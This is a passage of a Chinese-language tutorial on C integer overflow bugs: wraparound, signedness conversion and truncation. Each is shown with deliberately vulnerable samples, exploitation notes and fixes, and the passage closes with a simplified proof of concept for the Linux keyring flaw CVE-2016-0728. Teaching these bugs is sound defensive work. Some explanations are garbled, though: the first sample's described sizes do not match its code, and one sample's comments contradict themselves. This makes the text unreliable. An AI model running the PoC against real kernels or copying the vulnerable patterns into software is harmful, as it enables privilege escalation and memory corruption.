    char *buf = (char*)malloc(size);
    if (!buf) return;
    memcpy(buf, data, len * 2 + 0x100);  // 实际拷贝远大于size
    printf("Copied %d bytes into %d-byte buffer\n", len*2+0x100, size);
    free(buf);
}

int main() {
    unsigned short len = 0x8000;  // 触发环绕
    char *data = malloc(0x10000);
    memset(data, 'A', 0x10000);
    vulnerable(len, data);
    free(data);
    return 0;
}

该代码中，len=0x8000时，len*2=0x10000，但unsigned short截断为0x0000，加上0x10得到0x10字节堆块，而memcpy拷贝0x8100字节，导致堆溢出。实际利用中需绕过堆保护机制（如Safe Unlinking）。

整数环绕是指当算术运算的结果超出数据类型所能表示的范围时，数值会回绕到该类型的另一端。对于无符号整数，环绕是定义良好的行为（模运算）；对于有符号整数，在C/C++中是未定义行为，但实际硬件通常也会产生环绕。攻击者可利用此特性绕过边界检查，导致缓冲区溢出或逻辑错误。

**原理示例**：
c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

void vulnerable_function(uint32_t size) {
    char buffer[64];
    // 假设size由用户控制，且预期为64
    if (size > 64) {
        printf("Size too large!\n");
        return;
    }
    // 但size+1可能环绕为0，导致memcpy复制大量数据
    uint32_t copy_size = size + 1;
    if (copy_size > 64) {
        printf("Copy size too large!\n");
        return;
    }
    // 实际copy_size可能为0，但memcpy(size_t)参数为0时不做操作，但若size为0xFFFFFFFF，则size+1=0，绕过检查
    // 更常见的漏洞：size为0xFFFFFFFF时，size+1=0，但检查copy_size>64为假，然后memcpy(buffer, src, 0)无影响？
    // 实际危险场景：使用size作为循环次数或分配大小
    printf("Copy size: %u\n", copy_size);
}

int main() {
    vulnerable_function(0xFFFFFFFF); // 输入最大值
    return 0;
}


**安全风险**：整数环绕常被用于绕过长度检查。例如，在分配内存时，若计算`n * sizeof(type)`发生环绕，则分配的内存远小于预期，后续写入导致堆溢出。在循环中，若索引变量环绕，可能访问越界内存。

**利用方式**：攻击者提供精心构造的数值，使算术运算结果回绕到小值或零，从而通过安全检查，随后利用越界读写执行代码。防御措施包括使用安全整数运算库（如SafeInt、Checked Integer）、使用无符号类型并检查溢出、或使用`__builtin_add_overflow`等编译器内置函数。

**代码示例（利用整数环绕绕过长度检查）**：
c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void vulnerable(char *user_data, unsigned int len) {
    // 假设预期len不超过1024
    if (len > 1024) {
        printf("Too long\n");
        return;
    }
    // 分配 len + 1 字节，若len=0xFFFFFFFF，则len+1=0，malloc(0)可能返回小堆块
    char *buf = (char*)malloc(len + 1);
    if (!buf) return;
    memcpy(buf, user_data, len); // 复制大量数据到小缓冲区，堆溢出
    buf[len] = '\0';
    free(buf);
}

此代码中，若`len=0xFFFFFFFF`，则`len+1`环绕为0，`malloc(0)`通常返回一个有效指针（但大小可能为16字节），随后`memcpy`复制约4GB数据，导致堆溢出。

有符号与无符号整数之间的隐式转换是C/C++中常见的陷阱。当有符号整数与无符号整数混合运算时，有符号整数会被隐式转换为无符号类型，可能导致负数变成很大的正数，从而绕过安全检查。

**原理**：在C语言中，如果表达式中同时存在有符号和无符号整数，编译器会将有符号整数转换为无符号整数（通过二进制补码表示）。例如，`-1`转换为`unsigned int`后变成`0xFFFFFFFF`（4294967295）。

**漏洞示例**：
c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int copy_data(char *dst, int dst_size, char *src, int src_size) {
    // dst_size和src_size都是int，可能为负数
    if (src_size > dst_size) {
        printf("Source too large\n");
        return -1;
    }
    // 这里dst_size和src_size都是int，但memcpy第三个参数是size_t（无符号）
    // 如果src_size为负数，比较src_size > dst_size时，两者都被转换为无符号
    // 负数src_size变成很大的正数，导致条件为真，返回-1，看似安全
    // 但若dst_size也为负数，则比较结果可能相反
    // 更常见的漏洞：直接使用src_size作为memcpy长度
    memcpy(dst, src, src_size); // 若src_size为负数，转换为size_t后为极大值，导致缓冲区溢出
    return 0;
}

int main() {
    char buf[10];
    char *data = "This is a very long string that will overflow";
    // 传入负的src_size
    copy_data(buf, 10, data, -1);
    return 0;
}


**分析**：`copy_data`中，`src_size`为`-1`，在比较`src_size > dst_size`时，两者都被转换为`unsigned int`。`-1`变成`0xFFFFFFFF`，`10`不变，因此条件为真，函数返回-1，看似阻止了复制。但若攻击者传入`dst_size`为负数（例如-1），则比较结果可能为假，从而执行`memcpy`。更危险的是，如果程序员直接使用`src_size`作为`memcpy`的长度参数，即使比较通过，`src_size`为负数时转换为`size_t`会变成极大值，导致缓冲区溢出。

**利用方式**：攻击者通过控制有符号整数参数为负值，使隐式转换后产生巨大无符号值，从而绕过长度检查或直接导致溢出。防御措施包括：始终使用无符号类型表示大小和长度；在比较前显式检查负数；使用`size_t`类型；启用编译器警告（如`-Wsign-compare`）。

**修复代码**：
c
int copy_data_fixed(char *dst, size_t dst_size, char *src, size_t src_size) {
    if (src_size > dst_size) {
        return -1;
    }
    memcpy(dst, src, src_size);
    return 0;
}

使用`size_t`避免符号问题。

整数截断发生在将一个较大数据类型的值赋值给较小数据类型时，高位被丢弃，只保留低位。这在C/C++中常见于将`int`赋值给`short`或`char`，或将`size_t`赋值给`int`等。攻击者可利用截断绕过大小检查，导致缓冲区溢出。

**原理**：例如，`unsigned int`（32位）赋值给`unsigned short`（16位）时，高16位被丢弃。若原始值为`0x10000`（65536），截断后变为`0x0000`（0）。

**漏洞示例**：
c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void process_data(unsigned int input_len) {
    unsigned short len = input_len; // 截断：高16位丢失
    char *buffer = (char*)malloc(len);
    if (!buffer) return;
    // 假设用户输入input_len为0x10001（65537），截断后len=1
    // 但后续操作可能使用input_len作为实际数据长度
    // 例如从网络读取input_len字节到buffer，但buffer只有1字节，导致堆溢出
    printf("Allocated %hu bytes, but will read %u bytes\n", len, input_len);
    // 实际漏洞代码：read(fd, buffer, input_len);
    free(buffer);
}

int main() {
    process_data(0x10001); // 65537
    return 0;
}


**分析**：`input_len`为`0x10001`（65537），赋值给`unsigned short`后变为`1`。`malloc(1)`分配1字节，但后续若使用`input_len`作为读取长度，则读取65537字节到1字节缓冲区，导致堆溢出。攻击者可通过控制`input_len`使截断后的小值通过安全检查，而实际使用大值造成溢出。

**利用方式**：常见于网络协议解析、文件格式处理中。例如，一个数据包头部包含16位长度字段，但内部处理使用32位值，若未正确截断或检查，可能导致越界。

**防御措施**：
1. 避免将较大类型赋值给较小类型，若必须，则先检查值是否在目标类型范围内。
2. 使用`size_t`等一致类型。
3. 启用编译器警告（`-Wconversion`）。
4. 使用安全函数如`calloc`或`reallocarray`。

**修复代码**：
c
void process_data_fixed(unsigned int input_len) {
    if (input_len > USHRT_MAX) {
        printf("Length too large\n");
        return;
    }
    unsigned short len = (unsigned short)input_len;
    char *buffer = (char*)malloc(len);
    // ...
}

或直接使用`size_t`类型并保持一致性。

CVE-2016-0728是Linux内核keyring子系统中的一个整数溢出漏洞，可导致本地权限提升。漏洞存在于`/security/keys/keyctl.c`中的`join_session_keyring`函数。

**漏洞成因**：
`join_session_keyring`函数在处理`keyring`引用计数时，使用`atomic_inc`递增引用计数，但未检查是否溢出。当`keyring`的引用计数达到最大值`INT_MAX`时，再次递增会导致回绕到负数（有符号整数溢出）。由于引用计数用于判断是否释放对象，负数引用计数可能导致内核错误地释放仍在使用的`keyring`，造成释放后使用（use-after-free）。攻击者可通过多次调用`keyctl(KEYCTL_JOIN_SESSION_KEYRING, ...)`使引用计数溢出，然后利用释放后的内存执行任意代码。

**受影响版本**：Linux内核版本2.6.10至4.4（修复于4.4.1、4.3.5、4.2.8等）。

**POC原理**：
1. 创建一个`keyring`对象。
2. 反复调用`keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_serial)`，每次调用会增加该`keyring`的引用计数。
3. 当引用计数达到`INT_MAX`后，下一次调用使其回绕到负数（例如`-2147483648`）。
4. 此时，若其他操作尝试减少引用计数（如释放`keyring`），由于引用计数为负，可能触发`BUG_ON`或导致释放逻辑异常。
5. 攻击者可通过精心构造的内存布局，利用释放后的`keyring`对象控制内核内存，提升权限。

**POC代码片段**（简化）：
c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>

int main() {
    int keyring = syscall(SYS_keyctl, KEYCTL_JOIN_SESSION_KEYRING, NULL);
    if (keyring == -1) {
        perror("keyctl");
        exit(1);
    }
    // 循环增加引用计数，直到溢出
    for (long i = 0; i < 0x100000000LL; i++) {
        int ret = syscall(SYS_keyctl, KEYCTL_JOIN_SESSION_KEYRING, keyring);
        if (ret == -1) {
            perror("keyctl");
            break;
        }
        if (i % 1000000 == 0) printf("Iteration %ld\n", i);
    }
    // 溢出后，尝试释放keyring触发use-after-free
    syscall(SYS_keyctl, KEYCTL_REVOKE, keyring);
    return 0;
}

注意：实际利用需要绕过引用计数检查，并配合堆喷射等技术。

**修复方法**：
Linux内核社区在提交`c6f4a42de6b4`中修复了此漏洞。修复方法是在递增引用计数前检查是否已达到`INT_MAX`，若达到则返回错误，避免溢出。具体代码：
